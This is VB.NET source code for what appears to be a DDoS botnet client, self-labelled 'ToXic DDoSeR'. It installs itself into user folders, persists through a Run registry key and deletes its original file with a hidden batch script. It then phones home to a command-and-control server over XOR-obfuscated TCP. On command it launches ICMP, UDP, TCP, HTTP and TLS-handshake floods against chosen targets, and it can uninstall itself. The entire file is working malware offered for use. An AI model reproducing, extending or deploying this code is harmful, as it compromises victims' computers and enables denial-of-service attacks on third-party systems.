﻿Imports System.IO
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Net.Security
Imports System.Net.Sockets
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Form1

    Private C2 As String                                      ' Server IP
    Private C2_port As Integer                                ' Server Port
    Private base_dir, sub_dir, full_dir, exe_name As String   ' Installation base folder, sub_folder, full path, and filename
    Private reg_key, xor_key As String                        ' registry key value and password value for XOR encrypted traffic
    Private melt_file As Boolean = False                      ' Control melt of the parent binary once executed
    Private C2_listen As Boolean = True                       ' Control data transmission to/from server
    Private JobActive As Boolean = False                      ' Manage operation of DDoS-attack routinues
    Private mutex As Mutex                                    ' Mutual exlusion for instance control

    Private junk() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False

        'initial staging routine
        bin_setup()

        'begin conversation with server
        System.Threading.ThreadPool.QueueUserWorkItem(Sub() transmit())
    End Sub

    Private Function bin_setup()
        'de-index user-specified parameters
        Dim content() As String = Split(File.ReadAllText(Application.ExecutablePath), "<FS>")

        '-------------------------------------------
        'Parameter index: (for user-reference)
        '-------------------------------------------
        '   0. C2 Server DDNS/IP
        '   1. C2 port number
        '   2. XOR encryption key (password)
        '   3. Installation directory
        '   4. Optional sub-directory
        '   5. Installed executable filename
        '   6. Registry start-up key value
        '   7. Process Mutual Exclusion string
        '   8. Optional file-melt
        '-------------------------------------------

        'decode user-specified parameters from base-64
        Dim byteArray As Byte() = Convert.FromBase64String(content(1))
        Dim args_decoded As String = System.Text.Encoding.UTF8.GetString(byteArray)

        'funnel arguments into array of strings
        Dim arg As String() = args_decoded.Split("|"c)

        'establish process mutex
        Dim hasHandle As Boolean
        mutex = New Mutex(True, arg(7), hasHandle)
        If Not hasHandle Then
            'process found! 

            'release mutex
            'mutex.ReleaseMutex()

            'exit
            'Environment.Exit(0)
        End If

        'resolve dynamic-dns/ip
        Dim ipaddr As IPAddress()

        Try
            ipaddr = Dns.GetHostAddresses(arg(0))

            'set server ip
            C2 = ipaddr(0).ToString()
        Catch ex As Exception
            MsgBox(ex.Message)
            Me.Close()
        End Try

        'set server port
        C2_port = Int(arg(1))

        'set xor encryption key
        xor_key = arg(2)

        'set registry key
        reg_key = arg(6)

        'set melt value
        If Not arg(8) = "0" Then
            melt_file = True
        End If

        'determine base directory for installation
        If arg(3) = "0" Then
            'no installation requests for binary. set to execution path

            full_dir = Path.GetDirectoryName(Application.ExecutablePath)
            base_dir = Path.GetDirectoryName(Application.ExecutablePath)

        Else
            'set installation directory
            If arg(3) = "AppData\Roaming" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            ElseIf arg(3) = "AppData\Microsoft" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft"
            ElseIf arg(3) = "User Profile" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            ElseIf arg(3) = "Documents" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Documents"
            ElseIf arg(3) = "Downloads" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Downloads"
            ElseIf arg(3) = "Favorites" Then
                base_dir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Favorites"
            Else
                base_dir = My.Computer.FileSystem.SpecialDirectories.Temp
            End If
        End If

        'set/create user-specified sub-directory
        If Not arg(4) = "0" Then
            sub_dir = arg(4)

            full_dir = Path.Combine(base_dir, sub_dir)

            Try
                My.Computer.FileSystem.CreateDirectory(full_dir)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try

        End If

        'set filename for installation
        If Not arg(5).ToLower.EndsWith(".exe") Then
            exe_name = arg(5) & ".exe"
        Else
            exe_name = arg(5)
        End If

        'determine if installation is needed
        Dim full_path As String = Path.Combine(full_dir, exe_name)

        If Not Application.ExecutablePath.Contains(full_path) Then
            'install to disk
            Try
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, full_path)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End If

        'setup registry key
        If Not arg(6) = "0" Then
            Try
                Dim rkey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)

                If rkey IsNot Nothing Then
                    rkey.SetValue(reg_key, full_path)
                End If
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End If

        'engage melt is applicable
        If Not Application.ExecutablePath.Contains(full_path) Then
            If melt_file = True Then
                file_melt(full_path)

                mutex.ReleaseMutex()

                Environment.Exit(0)
            End If
        End If

        'return to main routine...
    End Function

    Private Function file_melt(my_path As String)
        'create shell script
        Dim melt As String = "timeout /T 5 & del /Q " & Chr(34) & Application.ExecutablePath & Chr(34) & " & start " & Chr(34) & Chr(34) & " " & Chr(34) & my_path & Chr(34) '& " && del /Q %0"
        File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp & "\melt.bat", melt)

        'execute script
        Dim startInfo As New ProcessStartInfo()
        startInfo.FileName = My.Computer.FileSystem.SpecialDirectories.Temp & "\melt.bat"
        startInfo.WindowStyle = ProcessWindowStyle.Hidden
        startInfo.CreateNoWindow = True
        Process.Start(startInfo)
    End Function

    Function XOR_EncryptDecrypt(ByVal data As Byte(), ByVal key As String) As Byte()
        Dim keyBytes As Byte() = Encoding.ASCII.GetBytes(key)
        Dim result As Byte() = New Byte(data.Length - 1) {}
        For i As Integer = 0 To data.Length - 1
            result(i) = data(i) Xor keyBytes(i Mod keyBytes.Length)
        Next
        Return result
    End Function

    Private Sub transmit()
        CheckForIllegalCrossThreadCalls = False

        Dim client As TcpClient = Nothing

        While C2_listen
            Try
                client = New TcpClient()
                client.SendTimeout = 1500

                client.Connect(C2, C2_port)

                Dim Stream As NetworkStream = client.GetStream()

                'phone home to server
                Dim message As String = "Armory call!"
                Dim data As Byte() = Encoding.ASCII.GetBytes(message)
                data = XOR_EncryptDecrypt(data, xor_key)

                Stream.Write(data, 0, data.Length)

                Do
                    Dim response As String = ""
                    Dim dataBuffer As Byte() = New Byte(1000) {}
                    Dim bytesRead As Integer = Stream.Read(dataBuffer, 0, dataBuffer.Length)

                    'only read relevant bytes
                    If bytesRead > 0 Then
                        dataBuffer = XOR_EncryptDecrypt(dataBuffer, xor_key)
                        response = Encoding.ASCII.GetString(dataBuffer, 0, bytesRead).Trim()

                        'process commands
                        If response = "Welcome to the NET!" Then
                            'synchronized with server / do nothing

                        ElseIf response = "Wake up Neo..." Then
                            'keep-alive pulse / do nothing

                        ElseIf response = "u_stall" Then
                            'uninstall
                            Try
                                'remove registry key
                                Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                                If regKey IsNot Nothing Then
                                    regKey.DeleteValue(reg_key, False)
                                End If
                            Catch : End Try

                            'self-destruct + exit
                            file_melt(Path.Combine(base_dir, sub_dir, exe_name))

                            mutex.ReleaseMutex()

                            Stream.Close() : client.Close()

                            Environment.Exit(0)

                        ElseIf response = "r_cnct" Then
                            'reconnect
                            Stream.Close() : client.Close()
                            Exit Do

                        ElseIf response = "d_cnct" Then
                            'disconnect
                            Stream.Close() : client.Close()

                            C2_listen = False

                            Environment.Exit(0)
                        ElseIf response.StartsWith("d_atk:") Then
                            'prepare ddos attack

                            '-------------------------------------------
                            'DDoS index: (for user-reference)
                            '-------------------------------------------
                            '   0. Attack type
                            '   1. IP Address
                            '   2. Domain (ip also if not website)
                            '   3. Port
                            '   4. Buffer size (minimum)
                            '   5. Buffer size (maximum)
                            '
                            ' Example: 'd_atk:<TYPE>|<IP>|<DOMAIN>|<PORT>|<MIN_BYTE>|<MAX_BYTE>
                            '
                            '-------------------------------------------

                            Dim params As String() = response.Split("|"c)

                            If params(0).Replace("d_atk:", "") = "UDP" Then
                                System.Threading.ThreadPool.QueueUserWorkItem(Sub() L4(params(1), Int(params(3)), Int(params(4)), Int(params(5)), 0))

                            ElseIf params(0).Replace("d_atk:", "") = "TCP" Then
                                System.Threading.ThreadPool.QueueUserWorkItem(Sub() L4(params(1), Int(params(3)), Int(params(4)), Int(params(5)), 1))

                            ElseIf params(0).Replace("d_atk:", "") = "ICMP" Then
                                System.Threading.ThreadPool.QueueUserWorkItem(Sub() L3(params(1), Int(params(4)), Int(params(5))))

                            ElseIf params(0).Replace("d_atk:", "") = "HTTP" Then
                                System.Threading.ThreadPool.QueueUserWorkItem(Sub() L7(params(1), params(2), Int(params(3))))

                            ElseIf params(0).Replace("d_atk:", "") = "TLS" Then
                                System.Threading.ThreadPool.QueueUserWorkItem(Sub() TLS(params(1), Int(params(3))))
                            End If

                            JobActive = True

                        ElseIf response = "halt" Then

                            'stop all running attacks
                            JobActive = False

                        Else

                            'other traffic/data anomlies found here

                        End If

                    End If
                Loop
            Catch ex As Exception
                'connection error. revive w/in five seconds
                Thread.Sleep(5000)
            End Try
        End While

        'connection terminated
        Environment.Exit(0)
    End Sub
    Private Sub L3(_ip As String, _min As Integer, _max As Integer)
        While JobActive
            Try
                'generate data buffer
                Dim rnd As New Random()

                Dim data As String = ""
                For i As Integer = 0 To rnd.Next(_min, _max)
                    data += junk(rnd.Next(0, junk.Length))
                Next

                Dim sysping As Ping = New Ping
                Dim pingOption As PingOptions = New PingOptions
                Dim buffer As Byte() = Encoding.ASCII.GetBytes(data)
                pingOption.Ttl = 255
                pingOption.DontFragment = False
                If sysping.Send(_ip, 1500, buffer, pingOption).Status = IPStatus.Success Then
                    'successful. do nothing
                End If
            Catch : End Try
        End While
    End Sub
    Private Sub L4(_ip As String, _prt As Integer, _min As Integer, _max As Integer, _type As Integer)
        Dim addr As New IPEndPoint(IPAddress.Parse(_ip), _prt)

        While JobActive
            Try
                Dim socket As Socket

                'establish socket
                If _type = 0 Then
                    'use udp
                    socket = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                Else
                    'use tcp
                    socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                End If

                'establish initial buffer
                Dim payload As Byte() = Encoding.ASCII.GetBytes("Dropped by ToXic DDoSeR!")

                'establish connection
                socket.Connect(addr)

                'send over socket
                socket.Send(payload)

                're-use socket to avoid local stack exhaustion
                While JobActive

                    'generate random query for header
                    Dim rnd As New Random()

                    Dim data As String = ""
                    For i As Integer = 0 To rnd.Next(_min, _max)
                        data += junk(rnd.Next(0, junk.Length))
                    Next


                    payload = Encoding.ASCII.GetBytes(data)

                    'send over socket
                    socket.Send(payload)
                End While

                'close socket
                socket.Close()

            Catch : End Try
        End While
    End Sub
    Private Sub L7(_ip As String, _domain As String, _prt As Integer)
        Dim addr As New IPEndPoint(IPAddress.Parse(_ip), _prt)

        While JobActive
            Try
                Dim socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                'establish initial http-request
                Dim payload As Byte() = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\nHost:" & _domain & "\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=200\r\n\r\n")

                'establish connection
                socket.Connect(addr)

                'send header over socket
                socket.Send(payload)

                're-use socket to avoid local stack exhaustion
                While JobActive

                    'generate new buffer
                    Dim rnd As New Random()

                    Dim data As String = "?="
                    For i As Integer = 0 To rnd.Next(10, 50)
                        data += junk(rnd.Next(0, junk.Length))
                    Next

                    payload = Encoding.ASCII.GetBytes("GET /" & data & " HTTP/1.1\r\nHost:" & _domain & "\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=200\r\n\r\n")

                    'send new headers over socket
                    socket.Send(payload)
                End While

                'close socket
                socket.Close()
            Catch : End Try
        End While
    End Sub

    Private Sub TLS(_ip As String, _prt As Integer)
        Dim _pad As String = getpadding()
        'TLSv1.2 initial handshake query (version 1.2 since TLSv1.3 has backward compatibility for TLSv1.2 and can handle both) 
        Dim _payload As String = _payload = ChrW(&H16) & ChrW(&H3) & ChrW(&H3) & _pad & ChrW(&H0) & ChrW(&H0) & ChrW(&H2) & ChrW(&HC0) & ChrW(&H2C) & ChrW(&HC0) & ChrW(&H30) & ChrW(&H1) & ChrW(&H0)
        'Raw hex ---> \x16\x03\x03...padding...\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00

        'Use this for TLSv1.3
        '_payload = ChrW(&H16) & ChrW(&H3) & ChrW(&H4) & _pad & ChrW(&H0) & ChrW(&H0) & ChrW(&H2) & ChrW(&HC0) & ChrW(&H2C) & ChrW(&HC0) & ChrW(&H30) & ChrW(&H1) & ChrW(&H0)
        'Raw hex ---> \x16\x03\x04...padding...\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00

        'convert payload to bytes
        Dim data As Byte() = Encoding.ASCII.GetBytes(_payload)

        While JobActive
            Try
                Using client As New TcpClient()
                    client.Connect(_ip, _prt)
                    Using sslStream As New SslStream(client.GetStream(), False, AddressOf ValidateServerCertificate, Nothing)
                        sslStream.AuthenticateAsClient(_ip)

                        'send handshake re-negotiation
                        sslStream.Write(data, 0, data.Length)

                        If Not JobActive Then
                            'abort when specified
                            Exit Sub
                        End If
                    End Using
                End Using
            Catch : End Try
        End While
    End Sub
    Private Function ValidateServerCertificate(sender As Object, certificate As X509Certificate, chain As X509Chain, sslPolicyErrors As SslPolicyErrors) As Boolean
        'return true to accept any certificate
        Return True
    End Function
    Private Function getpadding() As String
        ' used to generat TLS handshake hex padding
        Dim builder As New StringBuilder()
        Dim rand As New Random()
        For x As Integer = 1 To 4
            Dim hexDigit As Integer = rand.Next(16)
            builder.Append(Convert.ToString(hexDigit, 16))
        Next
        Return builder.ToString()
    End Function
End Class
